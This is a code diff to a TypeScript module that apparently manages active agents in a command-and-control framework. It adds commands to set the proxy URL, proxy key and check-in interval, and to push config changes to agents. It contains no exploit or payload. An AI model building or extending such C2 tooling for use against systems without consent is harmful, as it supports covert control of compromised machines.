@@ -1,15 +1,24 @@
+import Logger from "../lib/logger";
 import { Constants } from "../utils/utils";
 import BaseModule from "./base";
 
 const MODULE_DESCRIPTION = "manage active agents";
+export interface AgentModuleConfig {
+    proxy_url?: string;
+    proxy_enabled?: boolean;
+    proxy_key?: string;
+    interval?: number;
+}
 
 export default class AgentModule extends BaseModule {
+    log: Logger;
+
     constructor(protected configFile) {
         super("agent", configFile);
-
+        this.log = new Logger();
         this.description = MODULE_DESCRIPTION;
 
-        this.config = this.loadConfig;
+        this.config = this.getConfigFromFile() as AgentModuleConfig;
 
         this.defineCommands({
             sysinfo: {
@@ -34,21 +43,33 @@ export default class AgentModule extends BaseModule {
             },
             "set proxy_url": {
                 arguments: ["<url>"],
-                description: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
+                description: "change the proxy url to use (http://proxy.domain.tld/proxy.php)",
                 validateRegex: Constants.VALID_URL_REGEX,
+                execute: (params: string) => {
+                    this.config.proxy_url = params;
+                },
             },
             "set proxy_enabled": {
                 arguments: ["<1|0>"],
                 description: "enable or disable proxy communication",
+                execute: (params: string) => {
+                    this.config.proxy_enabled = params != "0" && params != "false" ? true : false;
+                },
             },
             "set proxy_key": {
                 arguments: ["<key>"],
-                description: "key to use for proxy communication",
+                description: "change key to use for proxy communication",
+                execute: (params: string) => {
+                    this.config.proxy_key = params;
+                },
             },
             "set interval": {
                 arguments: ["<ms>"],
-                description: "how often to checkin with the c2 (dns or proxy)",
+                description: "change how often to checkin with the c2 (dns or proxy)",
                 validateRegex: /^[0-9]+$/,
+                execute: (params: string) => {
+                    this.config.interval = Number(params) || this.config.interval;
+                },
             },
             // "set domain": {
             //     arguments: ["<c2.domain.tld>"],
@@ -58,6 +79,10 @@ export default class AgentModule extends BaseModule {
             //     arguments: ["<password>"],
             //     description: "set the c2 password"
             // },
+            send_config: {
+                arguments: [""],
+                description: "send the config changes to the agent",
+            },
         });
     }
 
